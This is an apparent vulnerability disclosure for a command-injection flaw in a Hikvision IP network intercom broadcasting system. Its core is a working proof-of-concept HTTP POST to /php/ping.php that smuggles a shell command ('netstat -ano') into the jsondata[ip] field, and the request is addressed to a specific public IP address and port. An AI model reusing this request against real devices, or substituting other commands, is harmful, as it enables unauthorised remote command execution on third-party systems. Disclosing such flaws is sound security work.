There is a command execution vulnerability in the IP network intercom broadcasting system of Hangzhou Hikvision Digital Technology Co., Ltd.

version:V3.0.3_20201113_RELEASE(HIK)

1.The login interface is as shown below

![image](https://github.com/willchen0011/cve/assets/13689053/fac8131c-e8be-4151-af34-535e8bc0686d)


2.Execute the command through the following POC

```
POST /php/ping.php HTTP/1.1
Host: 219.128.48.234:4080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://219.128.48.234:4080
Connection: close
Referer: http://219.128.48.234:4080/html/system.html
X-Forwarded-For: 1.1.1.1

jsondata%5Btype%5D=99&jsondata%5Bip%5D=netstat -ano
```

3.Execute the ```netstat -ano``` command to test.
![image](https://github.com/willchen0011/cve/assets/13689053/7660a7d3-e8db-42a4-83ea-dc417bb4f298)

